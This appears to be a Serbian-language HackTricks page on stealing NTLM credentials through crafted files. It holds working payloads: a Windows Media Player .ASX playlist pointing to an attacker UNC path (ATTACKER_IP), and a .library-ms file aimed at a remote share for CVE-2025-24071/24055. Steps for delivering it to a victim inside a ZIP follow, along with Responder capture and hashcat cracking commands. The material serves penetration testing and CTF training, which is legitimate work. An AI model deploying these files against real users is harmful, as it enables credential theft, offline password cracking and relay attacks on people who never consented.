# Mesta za krađu NTLM creds

{{#include ../../banners/hacktricks-training.md}}

**Pogledajte sve sjajne ideje sa [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) — od preuzimanja microsoft word datoteke online do izvora ntlm leaks: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md i [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**


### Windows Media Player playlists (.ASX/.WAX)

Ako možete naterati metu da otvori ili pregleda Windows Media Player playlistu koju kontrolišete, možete leak Net‑NTLMv2 tako što ćete postaviti unos na UNC putanju. WMP će pokušati da preuzme referenciranu medijsku datoteku preko SMB i implicitno će se autentifikovati.

Primer payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Tok prikupljanja i cracking:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-ugrađen .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer nesigurno obrađuje .library-ms fajlove kada se otvore direktno iz ZIP arhive. Ako definicija biblioteke pokazuje na udaljeni UNC put (npr. \\attacker\share), samo pregledanje/pokretanje .library-ms unutar ZIP-a natera Explorer da enumeriše UNC i pošalje NTLM autentifikaciju napadaču. To rezultuje NetNTLMv2 koji se može razbiti vanmrežno ili potencijalno relayed.

Minimalna .library-ms koja pokazuje na UNC napadača
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Operativni koraci
- Kreirajte .library-ms fajl sa XML-om iznad (podesite svoj IP/ime hosta).
- Spakujte ga u ZIP (na Windows: Send to → Compressed (zipped) folder) i dostavite ZIP cilju.
- Pokrenite NTLM capture listener i sačekajte da žrtva otvori .library-ms iz ZIP‑a.


## References
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)


{{#include ../../banners/hacktricks-training.md}}
